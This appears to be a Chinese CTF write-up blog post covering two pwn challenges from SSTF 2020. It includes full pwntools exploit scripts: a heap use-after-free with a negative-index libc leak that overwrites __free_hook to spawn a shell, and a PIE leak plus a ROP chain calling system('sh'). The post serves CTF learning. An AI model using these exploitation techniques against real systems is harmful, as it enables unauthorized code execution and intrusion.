---
layout:     post
title:      2020 ssctf(Hacker's Playground) wp
excerpt:    两个简单pwn题
date:       2020-08-19
author:     wxk1997
header-img: img/pwn-bg.png
catalog: true
tags:
    - ctf
    - pwn
categories:
    - writeup
---

# 前言

深刻地感受到自己变菜了. 两道非常简单的题目都没做出来. 一题是堆的uaf. 有个非常明显的整形溢出没有看到, 导致一直无法leak地址. 还有一题也是整形溢出可以, 需要在栈上构造rop链执行system("sh"), 也是卡住了. 太菜了 :(

# 正文

## T express

glibc 2.31. 保护全开. 有个 uaf 漏洞. 但是限制了只能malloc 7次. 通过另一个 off-by-one 漏洞可以实现 double free. 但是因为次数限制所以无法leak 地址. 卡了一会儿就去看别的题目了. 赛后学弟才在 show 功能中没有校验输入的索引是否为负数. 所以可以通过负的索引通过 stdout leak  lbic地址. 

```c
int index; // [rsp+Ch] [rbp-4h]

printf("Index of ticket: ");
index = read_l();
if ( index <= 6 && passes[index] ) {
    ...
}
```

没啥好说的, 就是菜. 不找借口. 

exp 如下:

```python
from pwn import *

filename = "./t_express"
ip = "t-express.sstf.site"
port = 1337

LOCAL = True if len(sys.argv)==1 else False

elf = ELF(filename)

remote_libc = "./libc.so.6"
if LOCAL:

    io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)

def choice( idx):
    io.sendlineafter( "choice: ", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add( ticket_type, data1, data2):
    choice( 1)
    io.sendlineafter( " buy?\n", str(ticket_type))
    io.sendafter( "First name: ", data1)
    io.sendafter( "Last name: ", data2)

def show( idx):
    choice( 2)
    io.sendlineafter( "Index of ticket: ", str(idx))

def rm( idx, op=''):
    choice( 3)
    io.sendlineafter( "Index of ticket: ", str(idx))
    if op != '':
        io.sendlineafter( "1) meal 2) safari 3) gift 4) ride\n", op)

add( 1, '/bin/sh\n', 'a'*8)
add( 1, 'bb', 'aaa\n')
add( 1, 'bb', 'aaa\n')
add( 1, '/bin/sh\n', 'aaa\n')
rm( 2)

rm( 1)
rm( 0, '4')
rm( 1)

show( 1)
io.recvuntil( "|name |  ")
heap_addr = u64(io.recv( 6) + b'\0\0')
lg("heap_addr", heap_addr)

show( -8)
io.recvuntil( "|name |  ")
io.recv( 9)
libc_addr = u64(io.recv( 6) + b'\0\0')
lg("libc_addr", libc_addr)

libc.address = libc_addr - 0x1ec723

lg("libc base", libc.address)

fh = libc.symbols['__free_hook']
system = libc.symbols['system']

add( 1, p64(fh), '\n')
add( 1, p64(fh), '\n')
add( 1, p64(system), '\n')

rm( 3)

io.interactive()

```

## Eat the pie

32位程序, 开了pie. 栈上有函数指针, 因为输入结尾没有用 `\0` 截断所以是可以以leak 代码段地址的. 我tm又没看到. 这道不算什么. 问题是之后的构造过程也没构造出来. 思路太僵化了. 赛后看了一下别的队的题解, 就是先跳到 read 构造一个 rop chain 再通过 rop 执行 system("sh").

exp如下

```python
from pwn import *

# io = process("./eat_the_pie")
io = remote( "eat-the-pie.sstf.site" , 1337 )

io.sendlineafter("Select > ", "4"*15)
io.recvuntil("4"*15+'\n')
tmp = io.recv(4)
elf_base = u32(tmp) - 0x74d
print("elf base", hex(elf_base))

g1 = elf_base + 0x970
io.sendafter("Select > ", "-1 dabcdabcd"+p32(g1))

PebpR = elf_base + 0x00000a9b
system = elf_base + 0x5a0
sh_str = elf_base + 0x31a

payload = flat(system, 'aaaa', sh_str, 'aaaa', PebpR)

sleep(1)
io.sendline(payload)
```


# 结语

周日刚做出一道堆题就开始洋洋得意了, 结果这次连两道贼基础的题目都没做出来. 太菜了, 不要再飘飘然忘乎所以了, 老老实实刷题吧.


# 参考

1. [比赛平台](https://playground.sstf.site/challenges)
2. [参考题解](https://github.com/theori-io/ctf/blob/master/SSTF%20CTF%202020%20Write%20Up%20-%20The%20Duck.pdf)
3. [ctf-time](https://ctftime.org/event/1107)